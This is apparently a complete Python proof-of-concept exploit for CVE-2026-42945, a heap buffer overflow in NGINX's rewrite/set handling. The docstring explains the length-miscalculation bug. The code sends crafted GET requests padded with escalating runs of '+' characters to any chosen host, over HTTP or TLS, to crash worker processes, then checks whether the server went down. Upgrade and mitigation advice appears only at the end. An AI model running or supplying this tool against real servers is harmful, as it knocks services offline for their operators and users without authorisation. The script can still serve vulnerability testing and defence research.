#!/usr/bin/env python3
"""
CVE-2026-42945 - NGINX Rift DoS Proof of Concept (Enhanced)
============================================================

Enhanced version with real-time console logging, hostname support,
SSL/TLS, and color-coded output.

Trigger conditions:
1. NGINX configuration uses both `rewrite` (replacement string containing '?')
   and `set` (referencing a capture group).
2. The request URI contains escapable characters (+, &, space, etc.).

How it works:
- The `rewrite` directive sets e->is_args = 1 (never reset).
- The length calculation phase for the `set` directive uses an all-zero
  sub-engine (le.is_args = 0).
- Length calculation does not account for URI escaping, but the actual copy
  operation does.
- Each escapable character expands from 1 byte to 3 bytes (%XX format).
- This causes a write beyond the allocated buffer boundary.

Disclaimer: For security research and educational purposes only.
"""

import os
import socket
import ssl
import sys
import time
import argparse
import re
from datetime import datetime


# ── Terminal / Color Support ──────────────────────────────────────────

COLORS = {
    "reset": "\033[0m",
    "bold": "\033[1m",
    "dim": "\033[2m",
    "red": "\033[91m",
    "green": "\033[92m",
    "yellow": "\033[93m",
    "blue": "\033[94m",
    "magenta": "\033[95m",
    "cyan": "\033[96m",
    "white": "\033[97m",
    "bg_red": "\033[101m",
    "bg_green": "\033[102m",
    "bg_yellow": "\033[103m",
}

USE_COLOR = True
request_counter = 0


def supports_color() -> bool:
    """Detect whether the terminal supports ANSI color codes."""
    if not sys.stdout.isatty():
        return False
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            INVALID_HANDLE_VALUE = -1
            STD_OUTPUT_HANDLE = -11
            handle = kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
            if handle == INVALID_HANDLE_VALUE:
                return False
            mode = ctypes.c_uint32()
            if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                return False
            if mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING:
                return True
            kernel32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING)
            return True
        except Exception:
            return False
    return True


def safe_print(text: str):
    """Print with graceful fallback if terminal cannot encode characters."""
    try:
        print(text)
    except UnicodeEncodeError:
        clean = re.sub(r"\033\[[0-9;]*m", "", text)
        clean = clean.encode(
            sys.stdout.encoding or "utf-8", errors="replace"
        ).decode(sys.stdout.encoding or "utf-8")
        print(clean)


def c(code: str) -> str:
    """Return ANSI code if color enabled, else empty string."""
    return COLORS[code] if USE_COLOR else ""


def timestamp() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:11]


def log_info(msg: str):
    safe_print(f"[{c('cyan')}{timestamp()}{c('reset')}] {c('bold')}[*]{c('reset')} {msg}")


def log_ok(msg: str):
    safe_print(f"[{c('green')}{timestamp()}{c('reset')}] {c('bold')}{c('green')}[+]{c('reset')} {msg}")


def log_warn(msg: str):
    safe_print(f"[{c('yellow')}{timestamp()}{c('reset')}] {c('bold')}{c('yellow')}[!]{c('reset')} {msg}")


def log_fail(msg: str):
    safe_print(f"[{c('red')}{timestamp()}{c('reset')}] {c('bold')}{c('red')}[-]{c('reset')} {msg}")


def log_raw(msg: str):
    safe_print(f"           {msg}")


def log_divider(char: str = "-", length: int = 58):
    log_raw(f"{c('dim')}{char * length}{c('reset')}")


# ── Hostname Helpers ──────────────────────────────────────────────────

IP_PATTERN = re.compile(r"^\d+\.\d+\.\d+\.\d+$")


def is_ip_address(value: str) -> bool:
    return bool(IP_PATTERN.match(value))


def resolve_hostname(host: str) -> str:
    return socket.gethostbyname(host)


# ── Enhanced Request / Response ───────────────────────────────────────

def create_malicious_request(path_payload: str, host: str, port: int) -> bytes:
    host_header = f"{host}:{port}" if port not in (80, 443) else host
    request = (
        f"GET /{path_payload} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    return request.encode()


def create_socket_connection(host: str, port: int, use_ssl: bool = False,
                             timeout: float = 5.0, verbose: bool = False,
                             sni_hostname: str = None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    if use_ssl:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(
            sock,
            server_hostname=sni_hostname or host
        )

    sock.connect((host, port))
    return sock


def pretty_print_http_request(raw: bytes, indent: int = 0):
    """Print HTTP request with visible line breaks."""
    pad = " " * indent
    try:
        text = raw.decode("utf-8", errors="replace")
    except Exception:
        text = repr(raw)
    for line in text.split("\r\n"):
        if line:
            log_raw(f"{pad}{line}")


def send_request(host: str, port: int, request: bytes,
                 timeout: float = 5.0, use_ssl: bool = False,
                 verbose: bool = False, sni_hostname: str = None,
                 req_label: str = None) -> tuple:
    """
    Send a request and return (success, response_or_error).

    When verbose=True, prints real-time request/response details.
    """
    global request_counter
    request_counter += 1
    label = req_label or f"#{request_counter}"

    if verbose:
        log_divider()
        log_raw(f"{c('bold')}{c('blue')}[Request {label}]{c('reset')} >>> "
                f"{c('dim')}CONNECT {host}:{port}"
                f"{' (SSL)' if use_ssl else ''}{c('reset')}")
        log_raw(f"{c('bold')}{c('blue')}[Request {label}]{c('reset')} >>> "
                f"SEND ({len(request)} bytes)")

    try:
        t_start = time.perf_counter()

        sock = create_socket_connection(
            host, port, use_ssl=use_ssl,
            timeout=timeout, verbose=verbose,
            sni_hostname=sni_hostname,
        )
        sock.sendall(request)

        if verbose:
            log_raw(f"{c('bold')}{c('blue')}[Request {label}]{c('reset')} >>> "
                    f"Request body:")
            pretty_print_http_request(request, indent=4)

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

        sock.close()

        t_elapsed = time.perf_counter() - t_start

        if verbose:
            log_raw(f"{c('bold')}{c('green')}[Request {label}]{c('reset')} <<< "
                    f"RECV ({len(response)} bytes, {t_elapsed:.3f}s)")
            if response:
                first_line = response.split(b"\r\n")[0].decode("utf-8", errors="replace")
                log_raw(f"{c('bold')}{c('green')}[Request {label}]{c('reset')} <<< "
                        f"{first_line}")
            log_divider()

        return (True, response)

    except (ConnectionRefusedError, ConnectionResetError,
            BrokenPipeError, OSError) as e:
        if verbose:
            log_raw(f"{c('bold')}{c('red')}[Request {label}]{c('reset')} <<< "
                    f"ERROR: {e}")
            log_divider()
        return (False, str(e))

    except socket.timeout:
        if verbose:
            log_raw(f"{c('bold')}{c('red')}[Request {label}]{c('reset')} <<< "
                    f"TIMEOUT")
            log_divider()
        return (False, "timeout")

    except ssl.SSLError as e:
        if verbose:
            log_raw(f"{c('bold')}{c('red')}[Request {label}]{c('reset')} <<< "
                    f"SSL ERROR: {e}")
            log_divider()
        return (False, f"SSL error: {e}")

    except Exception as e:
        if verbose:
            log_raw(f"{c('bold')}{c('red')}[Request {label}]{c('reset')} <<< "
                    f"UNEXPECTED ERROR: {e}")
            log_divider()
        return (False, str(e))


# ── Test Functions ────────────────────────────────────────────────────

def test_normal_request(host: str, port: int, use_ssl: bool = False,
                        verbose: bool = False, sni_hostname: str = None) -> bool:
    """Test if the server responds normally."""
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    success, response = send_request(
        host, port, request,
        use_ssl=use_ssl, verbose=verbose,
        sni_hostname=sni_hostname, req_label="probe",
    )
    return success and b"200 OK" in response


def test_vulnerability(host: str, port: int, overflow_size: int = 200,
                       path_prefix: str = "api", use_ssl: bool = False,
                       verbose: bool = False, sni_hostname: str = None) -> dict:
    """
    Test for CVE-2026-42945 vulnerability with real-time logging.

    Args:
        host: Target host (IP or hostname)
        port: Target port
        overflow_size: Expected number of overflow bytes
        path_prefix: URI path prefix (e.g. "api" for /api/...)
        use_ssl: Use SSL/TLS connection
        verbose: Enable real-time request/response logging
        sni_hostname: SNI hostname (defaults to host)

    Returns:
        Dictionary with test results
    """
    results = {
        "vulnerable": False,
        "details": [],
        "crash_detected": False,
        "requests_sent": 0,
    }

    # ── Step 1: Confirm server reachable ──
    log_info("Step 1: Checking if target server is reachable...")
    if verbose:
        log_raw(f"{c('dim')}Sending: GET / HTTP/1.1 -> {host}:{port}{c('reset')}")

    if not test_normal_request(host, port, use_ssl, verbose, sni_hostname):
        log_fail("Target server is unreachable")
        results["details"].append("Target server is unreachable")
        return results
    log_ok("Server is running normally")

    # ── Step 2: Test vulnerable location ──
    log_info("Step 2: Testing if the vulnerable location is reachable...")
    normal_api_request = create_malicious_request(
        f"{path_prefix}/test_endpoint", host, port
    )
    success, response = send_request(
        host, port, normal_api_request,
        use_ssl=use_ssl, verbose=verbose,
        sni_hostname=sni_hostname, req_label="2",
    )
    if success:
        if b"200" in response or b"302" in response or b"301" in response:
            log_ok("Vulnerable location is reachable")
            results["details"].append("Target location is reachable")
        else:
            status = response.split(b"\r\n")[0].decode("utf-8", errors="replace") if response else "no response"
            log_warn(f"Unexpected response: {status}")
    else:
        log_fail(f"Cannot reach target location: {response}")
        results["details"].append(f"Cannot reach target location: {response}")
        return results

    # ── Step 3: Small overflow ──
    log_info("Step 3: Sending a small overflow test request...")
    small_payload = f"{path_prefix}/" + "+" * 10
    small_request = create_malicious_request(small_payload, host, port)
    success, response = send_request(
        host, port, small_request,
        use_ssl=use_ssl, verbose=verbose,
        sni_hostname=sni_hostname, req_label="3a",
    )
    if success:
        log_ok("Small-scale test: Server responded normally")
    else:
        log_warn(f"Small-scale test: Connection abnormal - {response}")
        results["crash_detected"] = True
    results["requests_sent"] += 1

    # ── Step 4: Large overflow ──
    num_escapable_chars = overflow_size // 2
    log_info(f"Step 4: Sending large overflow request "
             f"({num_escapable_chars} escapable chars, "
             f"expected overflow {overflow_size} bytes)...")

    large_payload = f"{path_prefix}/" + "+" * num_escapable_chars
    large_request = create_malicious_request(large_payload, host, port)
    success, response = send_request(
        host, port, large_request,
        use_ssl=use_ssl, verbose=verbose,
        sni_hostname=sni_hostname, req_label="4",
    )
    if not success:
        log_warn(f"Large-scale test: Connection abnormal - {response}")
        results["crash_detected"] = True
        results["details"].append(
            f"Connection abnormal after sending {num_escapable_chars} "
            f"escapable chars"
        )
    else:
        if b"502" in response or b"500" in response:
            log_warn("Received 502/500 error - worker may have crashed")
            results["crash_detected"] = True
        else:
            log_info("Server still responding (may need larger payload)")
    results["requests_sent"] += 1

    # ── Step 5: Re-check ──
    log_info("Step 5: Waiting 2 seconds then re-checking server status...")
    log_raw(f"{c('dim')}Sleeping 2s...{c('reset')}")
    time.sleep(2)

    log_info("Re-checking server...")
    server_up = test_normal_request(host, port, use_ssl, verbose, sni_hostname)
    if server_up:
        if results["crash_detected"]:
            log_ok("Server has recovered (master forked a new worker)")
            results["vulnerable"] = True
            results["details"].append(
                "Worker crashed and recovered - vulnerability confirmed"
            )
        else:
            log_info("Server continues to run normally")
            results["details"].append(
                "No crash detected - config may not match or version patched"
            )
    else:
        log_fail("Server is unreachable - entire service may have crashed")
        results["vulnerable"] = True
        results["crash_detected"] = True
        results["details"].append("Server completely unavailable")

    # ── Step 6: Escalate payloads ──
    if not results["crash_detected"]:
        log_info("Step 6: Trying larger payloads...")
        for size in [500, 1000, 2000, 4000]:
            chars = size // 2
            payload = f"{path_prefix}/" + "+" * chars
            request = create_malicious_request(payload, host, port)
            success, response = send_request(
                host, port, request,
                use_ssl=use_ssl, verbose=verbose,
                sni_hostname=sni_hostname, req_label=f"6-{chars}",
            )
            results["requests_sent"] += 1

            anomaly = (not success or
                       (success and (b"502" in response or b"500" in response)))
            if anomaly:
                log_warn(f"Anomaly detected at {chars} characters!")
                results["crash_detected"] = True
                results["vulnerable"] = True
                results["details"].append(
                    f"Crash triggered at {chars} escapable characters"
                )
                break
            else:
                log_raw(f"    {c('dim')}{chars} characters: {c('green')}normal{c('reset')}")

    return results


def print_banner(args):
    scheme = "HTTPS" if args.ssl else "HTTP"
    target_str = f"{args.host}:{args.port}"

    print()
    print(f"  {c('bold')}{c('red')}{'=' * 60}{c('reset')}")
    print(f"  {c('bold')}{c('red')}  CVE-2026-42945 - NGINX Rift Heap Buffer Overflow PoC{c('reset')}")
    print(f"  {c('dim')}  Affected: NGINX 0.6.27 ~ 1.30.0{c('reset')}")
    print(f"  {c('dim')}  Type: Heap overflow -> DoS / RCE{c('reset')}")
    print(f"  {c('bold')}{c('red')}{'=' * 60}{c('reset')}")
    print()
    log_info(f"Target    : {c('bold')}{target_str} ({scheme}){c('reset')}")

    if not is_ip_address(args.host):
        try:
            resolved = resolve_hostname(args.host)
            log_info(f"Resolved  : {c('dim')}{args.host} -> {resolved}{c('reset')}")
        except socket.gaierror:
            log_warn(f"Resolved  : {c('red')}DNS resolution failed{c('reset')}")

    log_info(f"Path      : {c('dim')}/{args.path}/...{c('reset')}")
    log_info(f"Overflow  : {c('bold')}{args.overflow_size} bytes (initial){c('reset')}")
    log_info(f"Verbose   : {c('bold')}{'ON' if args.verbose else 'OFF'}{c('reset')}")
    print()


def main():
    global USE_COLOR

    parser = argparse.ArgumentParser(
        description="CVE-2026-42945 (NGINX Rift) DoS PoC - Enhanced Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --host 127.0.0.1 --port 8080
  %(prog)s --host example.com --verbose
  %(prog)s --host example.com --ssl --verbose
  %(prog)s --host 192.168.1.10 --path vulnerable-api --overflow-size 500
        """,
    )
    parser.add_argument(
        "--host", default="127.0.0.1",
        help="Target host - IP or hostname (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port", type=int, default=None,
        help="Target port (default: 8080 for IP, 80 for hostname, 443 if --ssl)",
    )
    parser.add_argument(
        "--path", default="api",
        help="URI path prefix, no leading/trailing slash (default: api)",
    )
    parser.add_argument(
        "--ssl", "--tls", action="store_true", dest="ssl",
        help="Use SSL/TLS (HTTPS)",
    )
    parser.add_argument(
        "--overflow-size", type=int, default=200,
        help="Initial overflow size in bytes (default: 200)",
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Enable real-time request/response logging",
    )
    parser.add_argument(
        "--no-color", action="store_true",
        help="Disable ANSI color output",
    )

    args = parser.parse_args()

    if args.no_color:
        USE_COLOR = False
    elif not supports_color():
        USE_COLOR = False

    # ── Auto-detect port ──
    if args.port is None:
        if is_ip_address(args.host):
            args.port = 8080
        elif args.ssl:
            args.port = 443
        else:
            args.port = 80

    # ── Verify hostname resolution ──
    if not is_ip_address(args.host):
        try:
            resolve_hostname(args.host)
        except socket.gaierror as e:
            print()
            log_fail(f"Cannot resolve hostname '{args.host}': {e}")
            return 1

    # ── Determine SNI hostname ──
    sni_hostname = args.host if not is_ip_address(args.host) else None

    # ── Display banner ──
    print_banner(args)

    # ── Run test ──
    results = test_vulnerability(
        host=args.host,
        port=args.port,
        overflow_size=args.overflow_size,
        path_prefix=args.path,
        use_ssl=args.ssl,
        verbose=args.verbose,
        sni_hostname=sni_hostname,
    )

    # ── Summary ──
    print()
    print(f"  {c('bold')}{'=' * 60}{c('reset')}")
    print(f"  {c('bold')}  Test Results{c('reset')}")
    print(f"  {c('bold')}{'=' * 60}{c('reset')}")

    if results["vulnerable"]:
        print(f"  {c('bold')}{c('bg_red')}{c('white')}  !!!  Target may be vulnerable to CVE-2026-42945  !!!{c('reset')}")
        print()
        print(f"  {c('yellow')}Evidence:{c('reset')}")
        for detail in results["details"]:
            print(f"    {c('dim')}*{c('reset')} {detail}")
        print()
        print(f"  {c('yellow')}Recommendations:{c('reset')}")
        print(f"    {c('bold')}1.{c('reset')} Immediately upgrade to NGINX 1.31.0 or later")
        print(f"    {c('bold')}2.{c('reset')} If upgrade not possible, check config for:")
        print(f"       - rewrite directive (with '?' in replacement string)")
        print(f"       - set directive (referencing regex capture groups like $1, $2)")
        print(f"    {c('bold')}3.{c('reset')} Temporary mitigation: remove the set directive or "
              f"avoid referencing capture groups after rewrite")
    elif results["crash_detected"]:
        print(f"  {c('yellow')}[!]{c('reset')} Abnormal behavior detected but cannot "
              f"confirm as CVE-2026-42945")
    else:
        print(f"  {c('dim')}[*]{c('reset')} No vulnerability indicators detected")
        print(f"    {c('dim')}Possible reasons:{c('reset')}")
        print(f"    {c('dim')}- Target already patched (>= 1.31.0){c('reset')}")
        print(f"    {c('dim')}- Config does not use vulnerable rewrite+set pattern{c('reset')}")
        print(f"    {c('dim')}- Network issues{c('reset')}")

    print()
    log_info(f"Total requests sent: {c('bold')}{results.get('requests_sent', 0)}{c('reset')}")
    print()

    return 0 if not results["vulnerable"] else 1


if __name__ == "__main__":
    sys.exit(main())
